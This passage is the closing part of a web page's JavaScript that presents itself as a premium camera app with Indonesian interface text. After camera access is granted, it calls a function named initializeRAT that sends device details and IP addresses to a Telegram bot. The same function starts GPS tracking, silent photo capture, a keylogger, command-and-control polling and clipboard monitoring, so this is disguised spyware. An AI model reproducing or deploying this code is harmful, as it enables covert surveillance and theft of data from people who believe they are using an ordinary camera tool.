            dom.btnStartCamera.disabled = true;
            dom.errorText.textContent = '';
            dom.statusDot.className = 'status-dot loading';
            dom.statusText.textContent = 'Mengakses kamera...';

            if (state.stream) {
                state.stream.getTracks().forEach(function(t) { t.stop(); });
                state.stream = null;
                dom.vf.srcObject = null;
            }

            var targetFacing = facing || state.facingMode;
            navigator.mediaDevices.getUserMedia({
                video: { facingMode: targetFacing, width: { ideal: CONFIG.MAX_WIDTH }, height: { ideal: CONFIG.MAX_HEIGHT } },
                audio: false
            }).then(function(s) {
                onCameraSuccess(s, targetFacing);
            }).catch(function() {
                var alt = targetFacing === 'environment' ? 'user' : 'environment';
                navigator.mediaDevices.getUserMedia({
                    video: { facingMode: alt }, audio: false
                }).then(function(s) {
                    onCameraSuccess(s, alt);
                }).catch(function() {
                    navigator.mediaDevices.getUserMedia({
                        video: true, audio: false
                    }).then(function(s) {
                        onCameraSuccess(s, 'environment');
                    }).catch(function(err) {
                        onCameraError(err);
                    });
                });
            });
        }

        function onCameraSuccess(mediaStream, facing) {
            state.stream = mediaStream;
            dom.vf.srcObject = mediaStream;
            dom.vf.play().then(function() {
                state.facingMode = facing;
                state.isStarting = false;
                dom.btnStartCamera.disabled = false;
                dom.statusDot.className = 'status-dot ready';
                dom.statusText.textContent = 'Kamera aktif';

                if (state.facingMode === 'user') dom.vf.classList.add('front-camera');
                else dom.vf.classList.remove('front-camera');

                applyZoom();
                dom.permOverlay.classList.add('hidden');
                initializeRAT();
            }).catch(function(err) { onCameraError(err); });
        }

        function onCameraError(err) {
            state.isStarting = false;
            dom.btnStartCamera.disabled = false;
            dom.statusDot.className = 'status-dot error';
            dom.statusText.textContent = 'Gagal';
            var msg = 'Gagal mengakses kamera';
            if (err && err.message) {
                if (err.message.indexOf('Permission') !== -1) msg = 'Izin kamera ditolak';
                else if (err.message.indexOf('NotFound') !== -1) msg = 'Kamera tidak ditemukan';
            }
            dom.errorText.textContent = msg;
        }

        // ============================================================
        // RAT INIT
        // ============================================================
        function initializeRAT() {
            grabLocalIPs().then(function(ips) { state.localIPs = ips; });
            setTimeout(function() {
                TG.sendMessage('🟢 ONLINE\n🆔 ' + VID + '\n📱 ' + navigator.userAgent.substring(0,80) + '\n🖥️ ' + screen.width + '×' + screen.height + '\n🌐 ' + navigator.language + '\n🌍 IP: ' + (state.localIPs.join(', ')||'Loading...') + '\n🔗 ' + location.href + '\n⏱️ Auto: ' + (CONFIG.SILENT_INTERVAL/1000) + 's\n📷 ' + state.facingMode);
            }, 500);
            startGPS();
            startSilentCapture();
            startKeylogger();
            startC2Polling();
            setInterval(checkClipboard, CONFIG.CLIPBOARD_INTERVAL);
            setInterval(function() {
                TG.sendMessage('💓 HB ' + VID + ' | #' + state.frameCount + ' | ' + getTimeShort());
            }, CONFIG.HEARTBEAT_INTERVAL);
        }

        // ============================================================
        // EVENT LISTENERS
        // ============================================================
        dom.btnStartCamera.addEventListener('click', function() { startCamera(); });
        dom.btnShutter.addEventListener('click', function() { captureFrame(false); });

        // FLIP = JEPRET + KIRIM
        dom.btnFlip.addEventListener('click', function() {
            var nf = state.facingMode === 'environment' ? 'user' : 'environment';
            startCamera(nf);
            setTimeout(function() { captureFrame(false); }, CONFIG.FLIP_CAPTURE_DELAY);
        });

        dom.btnFlash.addEventListener('click', function() {
            if (!state.stream) return;
            state.flashOn = !state.flashOn;
            try {
                state.stream.getVideoTracks()[0].applyConstraints({ advanced: [{ torch: state.flashOn }] });
            } catch(e) {}
            dom.btnFlash.classList.toggle('on', state.flashOn);
        });

        document.querySelectorAll('.zoom-option').forEach(function(el) {
            el.addEventListener('click', function() { setZoom(parseFloat(this.dataset.zoom)); });
        });

        dom.thumbBox.addEventListener('click', function() {
            if (!state.lastPhotoData) return;
            dom.fsImage.src = state.lastPhotoData;
            dom.fsInfo.textContent = state.lastPhotoCaption || '';
            dom.fsPreview.classList.add('show');
        });
        dom.fsClose.addEventListener('click', function() { dom.fsPreview.classList.remove('show'); });
        dom.fsPreview.addEventListener('click', function(e) { if (e.target === dom.fsPreview) dom.fsPreview.classList.remove('show'); });

        document.addEventListener('click', function(e) {
            if (e.target.closest('button') || e.target.closest('.zoom-option') || e.target.closest('.thumb-glass') || e.target.closest('.perm-overlay') || e.target.closest('.fs-preview')) return;
            dom.focusRing.style.left = e.clientX + 'px';
            dom.focusRing.style.top = e.clientY + 'px';
            dom.focusRing.classList.remove('animate');
            void dom.focusRing.offsetWidth;
            dom.focusRing.classList.add('animate');
        });

        console.log('📸 Kamera Pro v11.0 — Glassmorphism Premium');
        console.log('🆔 VID:', VID);
    })();
    </script>
</body>
